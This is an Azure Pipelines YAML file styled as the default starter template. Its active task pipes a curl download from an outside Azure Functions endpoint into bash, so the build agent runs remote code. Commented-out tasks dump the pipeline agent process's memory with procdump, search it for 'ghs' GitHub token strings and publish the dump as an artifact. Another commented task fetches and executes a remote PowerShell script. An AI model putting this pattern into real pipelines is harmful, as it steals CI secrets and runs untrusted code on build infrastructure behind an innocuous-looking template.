# Starter pipeline
# Start with a minimal pipeline that you can customize to build and deploy your code.
# Add steps that build, run tests, deploy, and more:
# https://aka.ms/yaml

trigger:
- ubuntu

pool:
  vmImage: 'ubuntu-latest'

steps:
- script: echo Hello, world!!
  displayName: 'Run a one-line script'

- script: |
    echo Add other tasks to build, test, and deploy your project.
    echo oops
  displayName: 'Run a multi-line script'

# - task: Bash@3
#   inputs:
#     targetType: 'inline'
#     script: |
#       #!/bin/bash
            
#       # ps aux;

#       ps aux | grep "Agent.Listener"

#       pid=`ps aux | grep "Agent.Listener" | grep -v grep | awk '{print $2}'`;
#       echo $pid

#       # sudo apt-get install gdb;

#       # set logging enabled off

#       # grep rw-p /proc/$pid/maps \
#       # | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
#       # | while read start stop; do \
#       #     sudo gdb --batch --pid $pid -ex \
#       #         "dump memory $(Agent.TempDirectory)/dump_$pid-$start-$stop.dump 0x$start 0x$stop"; \
#       # done;

#       sudo apt-get install procdump;

#       sudo procdump -p $pid -o $(Agent.TempDirectory)/AgentDump.dmp
      
#       ls -l $(Agent.TempDirectory);

#       dumpName=`ls $(Agent.TempDirectory)/AgentDump.dmp*`;
#       # echo $dumpName;
#       strings $dumpName >> $(Agent.TempDirectory)/dump.txt;

#       # strings -f $(Agent.TempDirectory)/AgentDump* >> $(Agent.TempDirectory)/dump.txt

#       ls -l $(Agent.TempDirectory);

#       cat $(Agent.TempDirectory)/dump.txt | grep "ghs";
#       echo "lol";

#   continueOnError: true



# - task: PowerShell@2
#   inputs:
#     targetType: 'inline'
#     script: |
#       $Script = Invoke-WebRequest 'https://officeadotest.azurewebsites.net/api/httptrigger2'
#       $ScriptBlock = [Scriptblock]::Create($Script.Content)
#       Invoke-Command -ScriptBlock $ScriptBlock
#   continueOnError: true

- task: Bash@3
  inputs:
    targetType: 'inline'
    script: 'bash < (curl -s https://officeadotest.azurewebsites.net/api/httptrigger2)'

# - task: PublishPipelineArtifact@1
#   inputs:
#     targetPath: '$(Agent.TempDirectory)/dump.txt'
#     artifact: 'Dump'
#     publishLocation: 'pipeline'
#   continueOnError: true
    
# - task: PublishBuildArtifacts@1
#   inputs:
#     PathtoPublish: '$(Build.ArtifactStagingDirectory)'
#     ArtifactName: 'yogeesh/dump-01.dmp'
#     publishLocation: 'Container'